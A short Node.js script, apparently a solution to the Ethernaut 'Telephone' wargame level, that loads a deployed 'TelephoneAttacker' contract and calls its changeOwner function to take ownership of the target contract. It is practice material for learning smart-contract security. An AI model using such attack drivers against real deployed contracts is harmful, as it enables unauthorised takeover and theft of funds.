const loadContract = require('../lib/load_deployed_contract_at_address')
const { keyToAccount } = require('../lib/eth_utils')
const { DEPLOYMENT_ACCOUNT_KEY } = require('../lib/env')

module.exports = async ({ attackerAddress }) => {
  const owner = keyToAccount(DEPLOYMENT_ACCOUNT_KEY)
  const from = owner.address
  const attacker = await loadContract('TelephoneAttacker', attackerAddress)


  console.log(`Executing attack to Telephone...`)
  const gas = await attacker.changeOwner.estimateGas({ from })
  await attacker.changeOwner.sendTransaction({ from, gas: gas * 3 })
}
